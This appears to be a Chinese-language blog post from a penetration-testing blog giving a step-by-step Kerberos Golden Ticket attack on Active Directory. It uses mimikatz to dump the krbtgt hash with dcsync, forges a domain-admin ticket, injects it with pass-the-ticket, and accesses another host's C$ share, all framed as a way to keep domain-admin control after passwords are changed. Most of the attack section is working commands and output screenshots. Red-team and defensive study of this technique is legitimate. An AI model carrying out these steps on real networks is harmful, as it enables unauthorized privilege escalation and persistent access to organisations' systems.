---
layout: post
title: Pass the Ticket——Goldenn Ticket
date: 2018-12-26 23:30:00
tags: 域渗透
categories: hack 
author: PythonPig
---
* content
{:toc}


### \#0x00 写在前面 
域渗透过程简单来说：搞定域内某机器—获取域管登录凭证—登录域控导出所有用户hash—完毕  
导出域管hash或明文密码后并不一定万事大吉，如果所有域管全部更改密码后我们之前的导出的hash和密码就没用了，如果我们还有域内机器普通用户的权限的话，可以通过本文的方法找回域管权限。本文主要聊一下在域渗透后期如何利用Kerberos认证过程中的问题来维持域权限。  

![golden ticket](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/golden%20ticket.jpg?raw=true) 图片来源于:https://image.slidesharecdn.com/3mnefd0ktnm25fuhevql-signature-3ee8f429e83aad7c58c04030239c498ebd8980c84258ad24441a38c6b7673977-poli-141010140847-conversion-gate02/95/bluehat-2014-the-attackers-view-of-windows-authentication-and-post-exploitation-25-638.jpg?cb=1412950380



### \#0x01 原理简介
在Kerberos认证过程中，用户的Ticket都是由Kerberos用户krbtgt的密码Hash生成的，如果获得了krbtgt密码的hash，则可以尝试伪造用户的Ticket，当然我们关心的是域管的Ticket。  
详细的Kerberos认证过程和Pass the Ticket的过程参见【参考】部分。  

### \#0x01 获取伪造Ticket所需数据
伪造Ticket所需的数据主要有  
1、krbtgt用户的nt hash  
2、域SID  
3、域名称  
4、域内机器普通用户权限

krbtgt的hash值可以在域控上通过mimikatz获取，在域控上执行如下命令  
```
mimikatz.exe "lsadump::dcsync /user:domain_name\krbtgt /domain:domain_name.com"
```
![get krbtgt hash](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/get%20krbtgt%20hash_1.jpg?raw=true)  

从上图中可以得到nt hash：30eefxxxxxxxxxxxxxxxxxxxxxxxcbc4e和域SID：S-1-5-21-xxxxxxxxx-xxxxxxxxxxx1-xxxxxxxxxxxxx  

### \#0x02 伪造Golden Ticket并导入——Pass the Ticket
使用非域管账户登录域内已控的机器，在该机器上完成域管权限的找回。  
1、首先查看下系统是否已有tgt  
```
mimikatz # kerberos::tgt
```
![have no tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/have%20no%20tgt.jpeg?raw=true) 
2、验证在没有tgt的情况下本地用户是否具有域管权限  
访问域内其他机器需要认证的共享文件  
![have no permission](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/have%20no%20permission_1.jpg?raw=true) 
3、生成tgt  
这里以域domain_name 和拟伪造的域管AD_admin_user为例进行说明  
```
mimikatz # kerberos::golden /user:AD_admin_user /domain:domain_name /sid:S-1-5-21-168xxxxx-3676xxxxxx1-34xxxx0176 /krbtgt:30eef769c3xxxxxxxxxxxcbc4e /ticket:AD_admin_user.kiribi
```
命令执行完成后，将在本目录下生成文件AD_admin_user.kiribi  
![create tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/create%20tgt_1.jpg?raw=true) 
4、导入tgt 
``` 
mimikatz # kerberos::ptt AD_admin_user.kiribi
```
![import tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/import%20tgt_1.jpg?raw=true) 
5、查看导入是否成功  
```
mimikatz # kerberos::tgt
```
![import success](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/import%20success_1.jpg?raw=true) 

6、尝试访问域内其他机器上的文件  
```
dir \\vas-xxxxxx\c$
```
![success](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/success_1.jpg?raw=true) 

### \#0x03 参考
* [域渗透的金之钥匙](http://drops.wooyun.org/tips/9591)
* [域渗透——Pass The Ticket](http://drops.wooyun.org/tips/12159)
* [谈谈基于Kerberos的Windows Network Authentication[上篇]](http://www.cnblogs.com/artech/archive/2007/07/05/807492.html)
* [[原创]谈谈基于Kerberos的Windows Network Authentication - Part II](http://www.cnblogs.com/artech/archive/2007/07/07/809545.html)
* [敞开的地狱之门：Kerberos协议的滥用](https://www.freebuf.com/articles/system/45631.html)
